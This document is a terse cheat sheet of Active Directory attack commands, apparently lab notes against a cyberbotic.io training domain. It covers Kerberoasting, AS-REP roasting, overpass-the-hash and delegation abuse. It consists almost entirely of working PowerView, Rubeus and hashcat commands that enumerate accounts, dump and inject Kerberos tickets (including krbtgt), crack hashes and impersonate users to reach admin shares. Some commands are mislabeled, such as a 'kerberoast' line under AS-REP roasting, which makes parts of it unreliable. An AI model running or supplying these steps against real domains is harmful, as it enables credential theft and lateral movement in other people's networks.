### Kerberoasting
```
powershell Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName
Rubeus kerberoast /outfile:hashes.asreproast
hashcat64.exe -a 0 -m 13100 C:\Users\NyaMeeEain\hashes.asreproast C:\Users\NyaMeeEain\Data\rockyou.txt -o winpass2.txt --force  --potfile-disable
```

### ASREPRoasting
```
powershell Get-DomainUser -PreauthNotRequired -Properties SamAccountName
Rubeus kerberoast format:hashcat /outfile:hashes.asreproast
hashcat64.exe -a 0 -m 18200 C:\Users\NyaMeeEain\hashes.asreproast C:\Users\NyaMeeEain\Data\rockyou.txt --force  --potfile-disable
```
### Overpass-the-Hash
```
Rubeus triage
Rubeus asktgt /user:n.John /rc4:2e8a408a8aec852ef2e458b938b8c071
Rubeus ptt /ticket:doIFXDCCBVi[…snip…]bDWN5YmVyYm90aWMuaW8=
```
### Unconstrained Delegation
the server or the service account that is granted this right is able to impersonate a user to authenticate to any services on any host,you are granting that account permission to delegate to any service
```
powershell Get-DomainComputer -Unconstrained -Properties DnsHostName
powershell Get-DomainGPOLocalGroup
powershell Get-DomainGroupMember -identity 'Workstation Admins' -recurse | select -exp membername 
powershell Get-DomainGroupMember -identity 'Helpdesk\Admins' -recurse | select -exp membername  
powershell Get-DomainOU -GPLink '{66465373-16CB-4F96-BD3A-12AE7D2C2371}' | % {Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname}
powershell Find-DomainUserLocation -userIdentity 'Workstation\Admins'  
execute-assembly C:\Users\Public\Rubeus.exe triage
execute-assembly C:\Users\Public\Rubeus.exe dump /service:krbtgt
execute-assembly C:\Users\Public\Rubeus.exe dump /luid:0x1b37e  
execute-assembly C:\Users\Public\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
execute-assembly C:\Users\Public\Rubeus.exe ptt /luid:0x21d8e17 /ticket:[...snip...]

```
```
execute-assembly C:\Users\Public\Rubeus.exe triage
execute-assembly C:\Users\Public\Rubeus.exe dump /luid:0x1f5d5  
execute-assembly C:\Users\Public\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
execute-assembly C:\Users\Public\Rubeus.exe ptt /luid:0x686cf9 /ticket:
```

### Constrained Delegation
constrained delegation takes it a step further by allowing you to configure which services an account can be delegated to.it limits delegation to a specified list, rather than allowing delegation to any service as in unconstrained delegation.
```
powershell Get-DomainComputer -TrustedToAuth -Properties DnsHostName, MSDS-AllowedToDelegateTo
powershell Get-DomainComputer web-2.cyberbotic.io | select -exp msds-AllowedToDelegateTo 
powershell Get-DomainComputer -TrustedToAuth | select -exp dnshostname 
Rubeus dump /service:krbtgt
Rubeus s4u /impersonateuser:n.glover /msdsspn:cifs/fs-1.cyberbotic.io /ticket:[...snip...]
Rubeus createnetonly /program:C:\Windows\System32\cmd.exe
Rubeus ptt /luid:0x239b995 /ticket:[...snip...]
ImpersonateProcess 3420
ls \\fs-1.cyberbotic.io\c$
```


